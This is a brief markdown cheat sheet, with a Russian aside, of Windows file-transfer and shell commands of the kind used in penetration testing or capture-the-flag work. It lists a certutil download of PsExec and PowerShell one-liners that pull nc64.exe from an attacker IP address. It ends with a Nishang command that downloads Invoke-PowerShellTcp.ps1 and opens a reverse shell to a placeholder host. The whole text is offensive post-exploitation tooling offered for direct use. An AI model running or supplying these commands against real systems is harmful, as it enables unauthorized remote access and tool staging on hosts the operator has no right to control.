# Windows

## cmd

```
certutil -urlcache -f -split https://live.sysinternals.com/PsExec64.exe
```

## powershell

```powershell
IEX(New-Object System.Net.WebClient).DownloadFile('http://10.10.15.139:8080/nc64.exe', 'nc64.exe')
```
> или через pipe
```powershell
echo IEX(New-Object System.Net.WebClient).DownloadFile('http://10.10.15.139:8080/nc64.exe', 'nc64.exe') | powershell -noprofile
```

> nishang
```powershell
powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port
```
